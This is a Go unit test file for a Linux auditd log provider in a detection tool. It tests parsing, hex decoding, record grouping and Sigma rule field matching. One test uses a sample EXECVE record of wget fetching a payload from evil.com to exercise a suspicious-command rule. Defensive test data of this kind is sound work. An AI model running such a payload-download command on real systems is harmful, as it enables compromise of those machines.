package audit

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/Nextron-Labs/aurora-linux/lib/provider"
)

// Sample audit log content matching the user's real input.
const sampleAuditLog = `type=SYSCALL msg=audit(1775057805.797:696): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=56216e858220 a2=441 a3=1b6 items=2 ppid=3916329 pid=3916330 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=3 comm="bash" exe="/usr/bin/bash" subj=unconfined key="etcwrite"
type=CWD msg=audit(1775057805.797:696): cwd="/home/pipezie/git/aurora-linux"
type=PATH msg=audit(1775057805.797:696): item=0 name="/etc/vim/" inode=32506126 dev=fe:01 mode=040755 ouid=0 ogid=0 rdev=00:00 nametype=PARENT cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0
type=PATH msg=audit(1775057805.797:696): item=1 name="/etc/vim/vimrc" inode=32506127 dev=fe:01 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0
type=PROCTITLE msg=audit(1775057805.797:696): proctitle="-bash"
`

// TestParseLineBasic tests parsing of a SYSCALL audit line.
func TestParseLineBasic(t *testing.T) {
	line := `type=SYSCALL msg=audit(1775057805.797:696): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=56216e858220 a2=441 a3=1b6 items=2 ppid=3916329 pid=3916330 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=3 comm="bash" exe="/usr/bin/bash" subj=unconfined key="etcwrite"`

	parsed, err := parseLine(line)
	if err != nil {
		t.Fatalf("parseLine returned error: %v", err)
	}
	if parsed == nil {
		t.Fatal("parseLine returned nil")
	}

	if parsed.RecordType != "SYSCALL" {
		t.Errorf("RecordType = %q, want SYSCALL", parsed.RecordType)
	}
	if parsed.Serial != 696 {
		t.Errorf("Serial = %d, want 696", parsed.Serial)
	}
	if parsed.Fields["syscall"] != "257" {
		t.Errorf("syscall = %q, want 257", parsed.Fields["syscall"])
	}
	if parsed.Fields["exe"] != "/usr/bin/bash" {
		t.Errorf("exe = %q, want /usr/bin/bash", parsed.Fields["exe"])
	}
	if parsed.Fields["pid"] != "3916330" {
		t.Errorf("pid = %q, want 3916330", parsed.Fields["pid"])
	}
	if parsed.Fields["key"] != "etcwrite" {
		t.Errorf("key = %q, want etcwrite", parsed.Fields["key"])
	}
}

// TestParseLineCWD tests parsing of a CWD audit line.
func TestParseLineCWD(t *testing.T) {
	line := `type=CWD msg=audit(1775057805.797:696): cwd="/home/pipezie/git/aurora-linux"`
	parsed, err := parseLine(line)
	if err != nil {
		t.Fatalf("parseLine returned error: %v", err)
	}
	if parsed.Fields["cwd"] != "/home/pipezie/git/aurora-linux" {
		t.Errorf("cwd = %q, want /home/pipezie/git/aurora-linux", parsed.Fields["cwd"])
	}
}

// TestParseLinePATH tests parsing of a PATH audit line.
func TestParseLinePATH(t *testing.T) {
	line := `type=PATH msg=audit(1775057805.797:696): item=1 name="/etc/vim/vimrc" inode=32506127 dev=fe:01 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0`
	parsed, err := parseLine(line)
	if err != nil {
		t.Fatalf("parseLine returned error: %v", err)
	}
	if parsed.Fields["name"] != "/etc/vim/vimrc" {
		t.Errorf("name = %q, want /etc/vim/vimrc", parsed.Fields["name"])
	}
	if parsed.Fields["nametype"] != "NORMAL" {
		t.Errorf("nametype = %q, want NORMAL", parsed.Fields["nametype"])
	}
}

// TestDecodeHexField tests hex decoding.
func TestDecodeHexField(t *testing.T) {
	got := decodeHexField("2D62617368")
	if got != "-bash" {
		t.Errorf("decodeHexField = %q, want -bash", got)
	}

	got = decodeHexField("-bash")
	if got != "-bash" {
		t.Errorf("decodeHexField for non-hex = %q, want -bash", got)
	}

	got = decodeHexField("6C73002D6C61")
	if got != "ls -la" {
		t.Errorf("decodeHexField with NUL = %q, want 'ls -la'", got)
	}
}

// TestRecordGrouper tests grouping of consecutive audit lines.
func TestRecordGrouper(t *testing.T) {
	lines := []string{
		`type=SYSCALL msg=audit(1775057805.797:696): syscall=257 pid=100 exe="/usr/bin/bash"`,
		`type=CWD msg=audit(1775057805.797:696): cwd="/home"`,
		`type=SYSCALL msg=audit(1775057805.797:697): syscall=59 pid=200 exe="/usr/bin/ls"`,
	}

	grouper := newRecordGrouper()
	var records []*auditRecord

	for _, l := range lines {
		parsed, err := parseLine(l)
		if err != nil {
			t.Fatalf("parseLine: %v", err)
		}
		if completed := grouper.AddLine(parsed); completed != nil {
			records = append(records, completed)
		}
	}
	if final := grouper.Flush(); final != nil {
		records = append(records, final)
	}

	if len(records) != 2 {
		t.Fatalf("got %d records, want 2", len(records))
	}
	if records[0].Key != "1775057805.797:696" {
		t.Errorf("first record key = %q, want 1775057805.797:696", records[0].Key)
	}
	if len(records[0].Lines) != 2 {
		t.Errorf("first record has %d lines, want 2", len(records[0].Lines))
	}
	if records[1].Key != "1775057805.797:697" {
		t.Errorf("second record key = %q, want 1775057805.797:697", records[1].Key)
	}
}

// TestMapRecordToEventsRawFields tests that events contain raw audit fields
// and that SYSCALL fields are merged into child records.
func TestMapRecordToEventsRawFields(t *testing.T) {
	lines := []string{
		`type=SYSCALL msg=audit(1775057805.797:696): arch=c000003e syscall=257 success=yes pid=3916330 ppid=3916329 uid=0 comm="bash" exe="/usr/bin/bash" key="etcwrite"`,
		`type=CWD msg=audit(1775057805.797:696): cwd="/home/pipezie/git/aurora-linux"`,
		`type=PATH msg=audit(1775057805.797:696): item=1 name="/etc/vim/vimrc" nametype=NORMAL`,
		`type=PROCTITLE msg=audit(1775057805.797:696): proctitle=2D62617368`,
	}

	grouper := newRecordGrouper()
	for _, l := range lines {
		parsed, _ := parseLine(l)
		grouper.AddLine(parsed)
	}
	record := grouper.Flush()
	events := mapRecordToEvents(record)

	if len(events) != 4 {
		t.Fatalf("got %d events, want 4 (one per record type)", len(events))
	}

	// SYSCALL event: has its own fields directly
	syscallEvt := events[0]
	if v := syscallEvt.fields.Value("type"); v.String != "SYSCALL" {
		t.Errorf("event[0] type = %q, want SYSCALL", v.String)
	}
	if v := syscallEvt.fields.Value("key"); v.String != "etcwrite" {
		t.Errorf("event[0] key = %q, want etcwrite", v.String)
	}
	if v := syscallEvt.fields.Value("exe"); v.String != "/usr/bin/bash" {
		t.Errorf("event[0] exe = %q, want /usr/bin/bash", v.String)
	}

	// PATH event: has its own fields + SYSCALL fields merged
	pathEvt := events[2]
	if v := pathEvt.fields.Value("type"); v.String != "PATH" {
		t.Errorf("event[2] type = %q, want PATH", v.String)
	}
	if v := pathEvt.fields.Value("name"); v.String != "/etc/vim/vimrc" {
		t.Errorf("event[2] name = %q, want /etc/vim/vimrc", v.String)
	}
	// SYSCALL exe should be available in PATH event
	if v := pathEvt.fields.Value("exe"); v.String != "/usr/bin/bash" {
		t.Errorf("event[2] exe (from SYSCALL) = %q, want /usr/bin/bash", v.String)
	}
	// SYSCALL key should be available in PATH event
	if v := pathEvt.fields.Value("key"); v.String != "etcwrite" {
		t.Errorf("event[2] key (from SYSCALL) = %q, want etcwrite", v.String)
	}

	// PROCTITLE event: proctitle should be hex-decoded
	proctitleEvt := events[3]
	if v := proctitleEvt.fields.Value("type"); v.String != "PROCTITLE" {
		t.Errorf("event[3] type = %q, want PROCTITLE", v.String)
	}
	if v := proctitleEvt.fields.Value("proctitle"); v.String != "-bash" {
		t.Errorf("event[3] proctitle = %q, want -bash (hex-decoded)", v.String)
	}

	// All events should have the same PID from SYSCALL
	for i, evt := range events {
		if evt.pid != 3916330 {
			t.Errorf("event[%d] pid = %d, want 3916330", i, evt.pid)
		}
		if evt.source != SourceAuditd {
			t.Errorf("event[%d] source = %q, want %q", i, evt.source, SourceAuditd)
		}
	}
}

// TestMapRecordToEventsExecve tests EXECVE args are hex-decoded.
func TestMapRecordToEventsExecve(t *testing.T) {
	lines := []string{
		`type=SYSCALL msg=audit(1775057806.000:700): syscall=59 pid=5000 exe="/usr/bin/ls"`,
		`type=EXECVE msg=audit(1775057806.000:700): argc=2 a0="ls" a1="-la"`,
	}

	grouper := newRecordGrouper()
	for _, l := range lines {
		parsed, _ := parseLine(l)
		grouper.AddLine(parsed)
	}
	record := grouper.Flush()
	events := mapRecordToEvents(record)

	if len(events) != 2 {
		t.Fatalf("got %d events, want 2", len(events))
	}

	// EXECVE event should have raw a0, a1 fields
	execveEvt := events[1]
	if v := execveEvt.fields.Value("type"); v.String != "EXECVE" {
		t.Errorf("type = %q, want EXECVE", v.String)
	}
	if v := execveEvt.fields.Value("a0"); v.String != "ls" {
		t.Errorf("a0 = %q, want ls", v.String)
	}
	if v := execveEvt.fields.Value("a1"); v.String != "-la" {
		t.Errorf("a1 = %q, want -la", v.String)
	}
	// SYSCALL exe should be merged
	if v := execveEvt.fields.Value("exe"); v.String != "/usr/bin/ls" {
		t.Errorf("exe (from SYSCALL) = %q, want /usr/bin/ls", v.String)
	}
}

// TestSigmaRuleCompatibility tests that events match the field patterns used
// by SigmaHQ linux/auditd rules.
func TestSigmaRuleCompatibility(t *testing.T) {
	// Simulates what lnx_auditd_susp_c2_commands.yml expects:
	// selection: key: 'susp_activity'
	lines := []string{
		`type=SYSCALL msg=audit(1775057806.000:701): syscall=59 pid=100 exe="/usr/bin/wget" key="susp_activity"`,
		`type=EXECVE msg=audit(1775057806.000:701): argc=2 a0="wget" a1="http://evil.com/payload"`,
	}

	grouper := newRecordGrouper()
	for _, l := range lines {
		parsed, _ := parseLine(l)
		grouper.AddLine(parsed)
	}
	record := grouper.Flush()
	events := mapRecordToEvents(record)

	// The SYSCALL event should match: key='susp_activity'
	syscallEvt := events[0]
	keyVal := syscallEvt.fields.Value("key")
	if !keyVal.Valid || keyVal.String != "susp_activity" {
		t.Errorf("key = %q, want susp_activity", keyVal.String)
	}

	// The EXECVE event should match: type=EXECVE, a0=wget
	// AND have key from SYSCALL merged
	execveEvt := events[1]
	if v := execveEvt.fields.Value("type"); v.String != "EXECVE" {
		t.Errorf("type = %q, want EXECVE", v.String)
	}
	if v := execveEvt.fields.Value("a0"); v.String != "wget" {
		t.Errorf("a0 = %q, want wget", v.String)
	}
	if v := execveEvt.fields.Value("key"); v.String != "susp_activity" {
		t.Errorf("key (merged from SYSCALL) = %q, want susp_activity", v.String)
	}
}

// TestFullProviderFromFile tests the full provider reading from a temp file.
func TestFullProviderFromFile(t *testing.T) {
	tmpDir := t.TempDir()
	logFile := filepath.Join(tmpDir, "audit.log")
	if err := os.WriteFile(logFile, []byte(sampleAuditLog), 0644); err != nil {
		t.Fatal(err)
	}

	p := New(logFile)
	p.SetFollow(false) // don't tail in tests
	_ = p.AddSource(SourceAuditd)
	if err := p.Initialize(); err != nil {
		t.Fatal(err)
	}

	var events []provider.Event
	p.SendEvents(func(event provider.Event) {
		events = append(events, event)
	})

	// 5 lines in the log = 5 events (one per record type)
	if len(events) != 5 {
		t.Fatalf("got %d events, want 5", len(events))
	}

	// Verify each event has a type field
	expectedTypes := []string{"SYSCALL", "CWD", "PATH", "PATH", "PROCTITLE"}
	for i, evt := range events {
		typeVal := evt.Value("type")
		if !typeVal.Valid || typeVal.String != expectedTypes[i] {
			t.Errorf("event[%d] type = %q, want %q", i, typeVal.String, expectedTypes[i])
		}
		if evt.ID().ProviderName != ProviderName {
			t.Errorf("event[%d] ProviderName = %q, want %q", i, evt.ID().ProviderName, ProviderName)
		}
	}

	// PATH with nametype=NORMAL should have name=/etc/vim/vimrc
	pathEvt := events[3] // item=1, nametype=NORMAL
	if v := pathEvt.Value("name"); v.String != "/etc/vim/vimrc" {
		t.Errorf("PATH name = %q, want /etc/vim/vimrc", v.String)
	}
}
